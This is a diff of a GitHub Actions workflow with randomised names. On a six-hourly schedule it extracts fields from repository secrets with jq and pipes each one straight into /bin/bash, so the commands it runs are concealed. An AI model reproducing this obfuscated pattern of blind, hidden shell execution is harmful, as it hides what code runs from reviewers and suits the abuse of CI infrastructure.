@@ -2,8 +2,7 @@ name: gongnvzz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 0/6 * * *'
-
+    - cron: '56 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +10,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: gongnvzz
         env:
-          fexmn29: ${{ secrets.fexmn29 }}
+          p49: ${{ secrets.p49 }}
         run: |
-          echo $fexmn29 | jq -r .usn1091 | /bin/bash
-          echo $tsaw7 | jq -r .gazjd5890 | /bin/bash
-          echo $z14 | jq -r .wbm05 | /bin/bash
-          echo $yxs5 | jq -r .g66555 | /bin/bash
-          echo $oyv09 | jq -r .h406 | /bin/bash
+          echo $p49 | jq -r .hapn87 | /bin/bash
+          echo $jjlod5594 | jq -r .p25972 | /bin/bash
+          echo $n08 | jq -r .pugc1 | /bin/bash
+          echo $qmebd147 | jq -r .vg6 | /bin/bash
+          echo $mivlp55 | jq -r .uqgiw638 | /bin/bash
+          echo $jnlr156 | jq -r .y464 | /bin/bash
+          echo $s0485 | jq -r .ujbuj442 | /bin/bash
+          echo $jobq26 | jq -r .e8012 | /bin/bash
+          echo $c686 | jq -r .jyl3 | /bin/bash
+          echo $jhx5 | jq -r .pzwr99 | /bin/bash
+          echo $wg65353 | jq -r .vt775 | /bin/bash
+          echo $lmwn76 | jq -r .r60 | /bin/bash
+          echo $odt2189 | jq -r .mxbf11 | /bin/bash
+          echo $hsoml06 | jq -r .zbhk15 | /bin/bash
+          echo $ptlw9613 | jq -r .chajq3 | /bin/bash
+          echo $afwel02 | jq -r .ynpkv13 | /bin/bash
 
